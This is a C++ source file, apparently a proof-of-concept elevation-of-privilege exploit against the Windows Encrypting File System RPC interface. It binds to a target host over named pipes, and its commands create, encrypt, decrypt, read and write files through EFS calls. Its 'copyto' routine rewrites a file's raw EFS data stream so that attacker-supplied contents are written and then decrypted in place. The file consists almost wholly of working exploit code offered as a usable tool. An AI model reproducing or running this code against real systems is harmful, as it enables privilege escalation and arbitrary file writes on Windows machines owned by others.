// PoC_EfsEoP.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <stdio.h>
#include <string>
#include <sstream>
#include <vector>
#include <windows.h>
#include "efsrpc_h.h"
#include <sddl.h>

#pragma comment(lib, "rpcrt4.lib")

extern "C" {
    _Must_inspect_result_
        _Ret_maybenull_ _Post_writable_byte_size_(size) void* __RPC_USER MIDL_user_allocate(_In_ size_t size)
    {
        return new char[size];
    }

    void __RPC_USER MIDL_user_free(_Pre_maybenull_ _Post_invalid_ void* p)
    {
        delete[] p;
    }
} // extern "C"

std::wstring NumToString(int num)
{
    std::wstringstream ss;
    ss << num;
    return ss.str();
}

std::wstring GetErrorMessage(int error)
{
    WCHAR buf[1024];
    if (FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, nullptr, error, 0, buf, _countof(buf), nullptr) > 0)
    {
        return buf;
    }
    else
    {
        return NumToString(error);
    }
}

std::wstring GetErrorMessage()
{
    return GetErrorMessage(GetLastError());
}

__declspec(noreturn) void FatalError(const char* msg, int error)
{
    printf("%s: (%d) %ls\n", msg, error, GetErrorMessage(error).c_str());
    exit(1);
}

std::wstring GetSidSddl(PSID sid)
{
    std::wstring ret = L"Unknown SID";
    LPWSTR sddl;
    if (ConvertSidToStringSid(sid, &sddl))
    {
        ret = sddl;
        LocalFree(sddl);
    }
    return ret;
}

std::wstring GetUserFullName(PSID sid)
{
    WCHAR name[1024];
    WCHAR domain[1024];

    DWORD name_size = 1024;
    DWORD domain_size = 1024;
    SID_NAME_USE name_use;

    if (LookupAccountSid(nullptr, sid, name, &name_size,
        domain, &domain_size, &name_use))
    {
        std::wstring ret = domain;
        if (ret.empty())
            return name;
        return ret + L"\\" + name;
    }
    return L"Unknown User";
}

std::wstring GetRemotePath(const std::wstring& path)
{
    if (path.rfind(L"\\\\", 0) != 0)
        return L"\\\\.\\" + path;
    return path;
}

void __RPC_USER PipePush(
    char* state,
    unsigned char* buf,
    unsigned long ecount
)
{
    HANDLE h = state;

    if (ecount == 0)
        return;

    DWORD written_bytes = 0;
    if (!WriteFile(h, buf, ecount, &written_bytes, nullptr))
    {
        FatalError("WriteFile", GetLastError());
    }
    printf("Written %d bytes\n", written_bytes);
}

void __RPC_USER PipeAlloc(
    char* state,
    unsigned long bsize,
    unsigned char** buf,
    unsigned long* bcount
)
{
    printf("Requested allocating %lu bytes.\n", bsize);
    *bcount = bsize;
    *buf = new unsigned char[bsize];
}

void __RPC_USER PipePull(
    char* state,
    unsigned char* buf,
    unsigned long esize,
    unsigned long* ecount)
{
    HANDLE h = state;

    DWORD read_bytes = 0;

    if (!ReadFile(h, buf, esize, &read_bytes, nullptr))
    {
        read_bytes = 0;
    }
    printf("Read %d bytes\n", read_bytes);
    *ecount = read_bytes;
}

void __RPC_USER PipeBufferPush(
    char* state,
    unsigned char* buf,
    unsigned long ecount
)
{
    if (ecount == 0)
        return;

    std::vector<char>* vec = reinterpret_cast<std::vector<char>*>(state);
    vec->insert(vec->end(), buf, buf + ecount);
    printf("Received %d bytes\n", ecount);
}

void __RPC_USER PipeBufferPull(
    char* state,
    unsigned char* buf,
    unsigned long esize,
    unsigned long* ecount)
{
    std::vector<char>* vec = reinterpret_cast<std::vector<char>*>(state);
    if (vec->empty())
    {
        *ecount = 0;
        return;
    }

    unsigned long copy_size = vec->size() < esize ? vec->size() : esize;
    memcpy(buf, vec->data(), copy_size);
    vec->erase(vec->begin(), vec->begin() + copy_size);
    printf("Read %d bytes\n", copy_size);
    *ecount = copy_size;
}

template <typename T> void AppendValue(std::vector<char>& buf, T value)
{
    const char* base = reinterpret_cast<const char*>(&value);
    buf.insert(buf.end(), base, base + sizeof(T));
}

void AppendString(std::vector<char>& buf, const std::wstring& str)
{
    if (str.empty())
        return;
    const char* base = reinterpret_cast<const char*>(str.c_str());
    buf.insert(buf.end(), base, base + str.size() * sizeof(str[0]));
}

void AppendBuffer(std::vector<char>& buf, const std::vector<char>& from, size_t size)
{
    if (from.empty())
        return;
    buf.insert(buf.end(), from.data(), from.data() + size);
}

void AppendBuffer(std::vector<char>& buf, const std::vector<char>& from)
{
    AppendBuffer(buf, from, from.size());
}

template <typename T> T ReadValue(const std::vector<char>& from, size_t& ofs)
{
    size_t remaining = from.size() - ofs;
    if (remaining < sizeof(T))
    {
        FatalError("ReadValue", ERROR_NOT_ENOUGH_MEMORY);
    }
    T ret = *reinterpret_cast<const T*>(from.data() + ofs);
    ofs += sizeof(T);
    return ret;
}

std::vector<char> ReadBuffer(const std::vector<char>& from, size_t& ofs, size_t size)
{
    size_t remaining = from.size() - ofs;
    if (remaining < size)
    {
        FatalError("ReadBuffer", ERROR_NOT_ENOUGH_MEMORY);
    }
    auto ret = std::vector<char>(from.begin() + ofs, from.begin() + ofs + size);
    ofs += size;
    return ret;
}

void CopyChunk(std::vector<char>& buf, const std::vector<char>& from, size_t& ofs)
{
    int length = ReadValue<int>(from, ofs);
    AppendValue(buf, length);
    AppendBuffer(buf, ReadBuffer(from, ofs, length - 4));
}

void WriteStreamHeader(std::vector<char>& buf, const std::wstring& name)
{
    int name_length = name.size() * sizeof(wchar_t);
    int length = 4 + 8 + 4 + 8 + 4 + name_length;
    AppendValue(buf, length);
    AppendString(buf, L"NTFS");
    AppendValue(buf, 1);
    AppendValue<ULONGLONG>(buf, 0);
    AppendValue(buf, name_length);
    AppendString(buf, name);
}

void WriteGUREHeader(std::vector<char>& buf, const std::vector<char> contents)
{
    int length = 4 + 8 + 4 + contents.size();
    AppendValue(buf, length);
    AppendString(buf, L"GURE");
    AppendValue(buf, 0);
    AppendBuffer(buf, contents);
}

std::vector<char> ReadFile(const wchar_t* filename)
{
    HANDLE h = CreateFile(filename, FILE_GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING, 0, nullptr);
    if (h == INVALID_HANDLE_VALUE)
        FatalError("CreateFile", GetLastError());
    DWORD size = GetFileSize(h, nullptr);
    std::vector<char> buf(size);
    if (size > 0)
    {
        DWORD dwRead;
        if (!ReadFile(h, buf.data(), size, &dwRead, nullptr))
            FatalError("ReadFile", GetLastError());
    }

    CloseHandle(h);
    return buf;
}

std::vector<char> BuildEfsRawData(const std::vector<char>& data, const wchar_t* contents_file)
{
    std::vector<char> ret;
    size_t ofs = 0;
    AppendBuffer(ret, ReadBuffer(data, ofs, 20));

    // Copy the EFS metadata header.
    CopyChunk(ret, data, ofs);
    CopyChunk(ret, data, ofs);
    WriteStreamHeader(ret, L"::$DATA");
    WriteGUREHeader(ret, ReadFile(contents_file));

    return ret;
}

std::vector<char> BuildEfsRawData(const wchar_t* template_file, const wchar_t* contents_file)
{
    return BuildEfsRawData(ReadFile(template_file), contents_file);
 }

void WriteFile(const std::vector<char> buf, const wchar_t* file)
{
    HANDLE h = CreateFile(file, FILE_GENERIC_READ | FILE_GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_DELETE, nullptr, CREATE_ALWAYS, 0, nullptr);
    if (h == INVALID_HANDLE_VALUE)
        FatalError("CreateFile", GetLastError());
    if (!buf.empty())
    {
        DWORD written = 0;
        WriteFile(h, buf.data(), buf.size(), &written, nullptr);
    }
    CloseHandle(h);
}

void DoMkdir(handle_t hBinding, const std::vector<const wchar_t*>& args)
{
    PEXIMPORT_CONTEXT_HANDLE ctx = nullptr;
    std::wstring path = GetRemotePath(args[0]);
    printf("[INFO] Creating directory %ls\n", path.c_str());
    long error = EfsRpcOpenFileRaw(hBinding, &ctx, path.c_str(), CREATE_FOR_DIR | CREATE_FOR_IMPORT);
    if (error != 0)
    {
        FatalError("EfsRpcOpenFileRaw", error);
    }
    printf("[SUCCESS] Created directory.\n");
    EfsRpcCloseRaw(&ctx);
}


void CreateRemoteFile(handle_t hBinding, const std::wstring& path)
{
    PEXIMPORT_CONTEXT_HANDLE ctx = nullptr;
    printf("[INFO] Creating file %ls\n", path.c_str());
    long error = EfsRpcOpenFileRaw(hBinding, &ctx, path.c_str(), CREATE_FOR_IMPORT);
    if (error != 0)
    {
        FatalError("EfsRpcOpenFileRaw", error);
    }
    printf("[SUCCESS] Created file.\n");
    EfsRpcCloseRaw(&ctx);
}

void DoCreate(handle_t hBinding, const std::vector<const wchar_t*>& args)
{
    CreateRemoteFile(hBinding, GetRemotePath(args[0]));
}

void EncryptRemoteFile(handle_t hBinding, const std::wstring& path)
{
    printf("[INFO] Encrypting file %ls\n", path.c_str());
    long error = EfsRpcEncryptFileSrv(hBinding, path.c_str());
    if (error != 0)
    {
        FatalError("EfsRpcEncryptFileSrv", error);
    }
    printf("[SUCCESS] Encrypted file\n");
}

void DoEncrypt(handle_t hBinding, const std::vector<const wchar_t*>& args)
{
    EncryptRemoteFile(hBinding, GetRemotePath(args[0]));
}

void DecryptRemoteFile(handle_t hBinding, const std::wstring& path)
{
    printf("[INFO] Decrypting file %ls\n", path.c_str());
    long error = EfsRpcDecryptFileSrv(hBinding, path.c_str(), 0);
    if (error != 0)
    {
        FatalError("EfsRpcDecryptFileSrv", error);
    }
    printf("[SUCCESS] Decrypted file\n");
}

void DoDecrypt(handle_t hBinding, const std::vector<const wchar_t*>& args)
{
    DecryptRemoteFile(hBinding, GetRemotePath(args[0]));
}

void ReadRemoteFile(handle_t hBinding, const std::wstring& path, EFS_EXIM_PIPE* pipe)
{
    PEXIMPORT_CONTEXT_HANDLE ctx = nullptr;
    printf("[INFO] Reading file %ls\n", path.c_str());
    long error = EfsRpcOpenFileRaw(hBinding, &ctx, path.c_str(), 0);
    if (error != 0)
    {
        FatalError("EfsRpcOpenFileRaw", error);
    }
    printf("[SUCCESS] Opened file for reading\n");
    error = EfsRpcReadFileRaw(ctx, pipe);
    if (error != 0)
    {
        EfsRpcCloseRaw(&ctx);
        FatalError("EfsRpcReadFileRaw", error);
    }
    printf("[SUCCESS] Read file.\n");
    EfsRpcCloseRaw(&ctx);
}

void DoRead(handle_t hBinding, const std::vector<const wchar_t*>& args)
{
    printf("[INFO] Opening %ls for output\n", args[1]);
    HANDLE h = CreateFile(args[1], FILE_GENERIC_READ | FILE_GENERIC_WRITE, 
        FILE_SHARE_READ | FILE_SHARE_DELETE, nullptr, CREATE_ALWAYS, 0, nullptr);
    if (h == INVALID_HANDLE_VALUE)
        FatalError("CreateFile", GetLastError());

    EFS_EXIM_PIPE pipe = {};
    pipe.alloc = PipeAlloc;
    pipe.push = PipePush;
    pipe.state = static_cast<char*>(h);
    ReadRemoteFile(hBinding, GetRemotePath(args[0]), &pipe);
    CloseHandle(h);
}

void WriteRemoteFile(handle_t hBinding, const std::wstring& path, EFS_EXIM_PIPE* pipe)
{
    PEXIMPORT_CONTEXT_HANDLE ctx = nullptr;
    printf("[INFO] Writing file %ls\n", path.c_str());
    long error = EfsRpcOpenFileRaw(hBinding, &ctx, path.c_str(), CREATE_FOR_IMPORT);
    if (error != 0)
    {
        FatalError("EfsRpcOpenFileRaw", error);
    }
    printf("[SUCCESS] Opened file for writing.\n");
    error = EfsRpcWriteFileRaw(ctx, pipe);
    if (error != 0)
    {
        EfsRpcCloseRaw(&ctx);
        FatalError("EfsRpcReadFileRaw", error);
    }
    printf("[SUCCESS] Written file.\n");
    EfsRpcCloseRaw(&ctx);
}

void DoWrite(handle_t hBinding, const std::vector<const wchar_t*>& args)
{
    printf("[INFO] Opening %ls for input\n", args[1]);
    HANDLE h = CreateFile(args[1], FILE_GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, 0, nullptr);
    if (h == INVALID_HANDLE_VALUE)
        FatalError("CreateFile", GetLastError());

    EFS_EXIM_PIPE pipe = {};
    pipe.alloc = PipeAlloc;
    pipe.pull = PipePull;
    pipe.state = static_cast<char*>(h);

    WriteRemoteFile(hBinding, GetRemotePath(args[0]), &pipe);
    CloseHandle(h);
}

void DoDuplicate(handle_t hBinding, const std::vector<const wchar_t*>& args)
{
    std::wstring src = GetRemotePath(args[0]);
    std::wstring dest = GetRemotePath(args[1]);
    printf("[INFO] Duplicating %ls to %ls\n", src.c_str(), dest.c_str());

    EFS_RPC_BLOB blob = {};
    if (args.size() > 2)
    {
        printf("[INFO] Using SDDL %ls\n", args[2]);
        PSECURITY_DESCRIPTOR sd = nullptr;
        if (!ConvertStringSecurityDescriptorToSecurityDescriptor(args[2],
            SDDL_REVISION_1, &sd, &blob.cbData))
        {
            FatalError("ConvertStringSecurityDescriptorToSecurityDescriptor", GetLastError());
        }
        blob.bData = static_cast<unsigned char*>(sd);
    }

    long error = EfsRpcDuplicateEncryptionInfoFile(hBinding, src.c_str(), dest.c_str(), 
        CREATE_ALWAYS, 0, blob.bData ? &blob : nullptr, FALSE);
    if (error != 0)
    {
        FatalError("EfsRpcDuplicateEncryptionInfoFile", error);
    }
    printf("[SUCCESS] Duplicated file\n");
    if (blob.bData)
    {
        LocalFree(blob.bData);
    }
}

void DoCopy(handle_t hBinding, const std::vector<const wchar_t*>& args)
{
    std::wstring src = args[0];
    std::wstring dest = GetRemotePath(args[1]);
    printf("[INFO] Copying %ls to %ls\n", src.c_str(), dest.c_str());


    // Create the dest file.
    // Encrypt the dest file.
    // Read the dest files key info.
    // Modify ::$DATA stream to add unencrypted data.
    // Write back to dest file.
    // Decrypt the dest file.

    CreateRemoteFile(hBinding, dest);
    EncryptRemoteFile(hBinding, dest);
    EFS_EXIM_PIPE pipe = {};
    pipe.alloc = PipeAlloc;
    pipe.push = PipeBufferPush;
    pipe.pull = PipeBufferPull;
    std::vector<char> in_buf;
    pipe.state = reinterpret_cast<char*>(&in_buf);
    ReadRemoteFile(hBinding, dest, &pipe);
    printf("[INFO] Read %d bytes from file\n", in_buf.size());
    std::vector<char> out_buf = BuildEfsRawData(in_buf, src.c_str());
    pipe.state = reinterpret_cast<char*>(&out_buf);
    WriteRemoteFile(hBinding, dest, &pipe);
    DecryptRemoteFile(hBinding, dest);
    printf("[SUCCESS] Done.\n");
}

struct EFS_COMMAND_ENTRY {
    const wchar_t* name;
    size_t numargs;
    void (*callback)(handle_t hBinding, const std::vector<const wchar_t*>& args);
};

static EFS_COMMAND_ENTRY g_commands[] = {
    { L"mkdir",  1, DoMkdir },
    { L"create",  1, DoCreate },
    { L"enc",  1, DoEncrypt },
    { L"dec",  1, DoDecrypt },
    { L"read",  2, DoRead },
    { L"write",  2, DoWrite },
    { L"dup",  2, DoDuplicate },
    { L"copyto", 2, DoCopy },
};

EFS_COMMAND_ENTRY* GetCommand(const wchar_t* cmd)
{
    for (size_t i = 0; i < _countof(g_commands); ++i)
    {
        if (_wcsicmp(g_commands[i].name, cmd) == 0)
        {
            return &g_commands[i];
        }
    }

    return nullptr;
}

handle_t CreateBindingHandle(const wchar_t* hostname)
{
    WCHAR* szStringBinding = NULL;
    handle_t hBinding = NULL;

    std::wstring host_buf = hostname;
    RPC_STATUS status = RpcStringBindingComposeW(
        NULL,
        L"ncacn_np",
        &host_buf[0],
        nullptr,
        L"Security=delegation static false",
        &szStringBinding);
    if (status != 0)
    {
        FatalError("RpcStringBindingComposeW", status);
    }

    status = RpcBindingFromStringBinding(
        szStringBinding,
        &hBinding);
    if (status != 0)
    {
        FatalError("RpcBindingFromStringBinding", status);
    }

    std::wstring spn = L"HOST/";
    spn += hostname;

    status = RpcBindingSetAuthInfoW(hBinding, &spn[0], RPC_C_AUTHN_LEVEL_CONNECT,
        RPC_C_AUTHN_GSS_NEGOTIATE, nullptr, RPC_C_AUTHZ_NONE);
    if (status != 0)
    {
        FatalError("RpcBindingSetAuthInfo", status);
    }

    RpcStringFree(&szStringBinding);
    return hBinding;
}

void RunRpcClient(handle_t hBinding, EFS_COMMAND_ENTRY* cmd, const std::vector<const wchar_t*>& args)
{
    RpcTryExcept
    {
        cmd->callback(hBinding, args);
    }
    RpcExcept(1)
    {
        FatalError("RPC Error", RpcExceptionCode());
    }
    RpcEndExcept
}

int wmain(int argc, wchar_t** argv)
{
    if (argc < 3)
    {
        printf("Specify the hostname and command.");
        return 1;
    }

    EFS_COMMAND_ENTRY* cmd = GetCommand(argv[2]);
    if (cmd == nullptr)
    {
        printf("Unknown command %ls\n", argv[2]);
        return 1;
    }

    std::vector<const wchar_t*> args(argv + 3, argv + argc);
    if (args.size() < cmd->numargs)
    {
        printf("Not enough arguments. Expected %d, got %d\n", cmd->numargs, args.size());
        return 1;
    }
    handle_t hBinding = CreateBindingHandle(argv[1]);
    
    RunRpcClient(hBinding, cmd, args);
    RpcBindingFree(&hBinding);
}
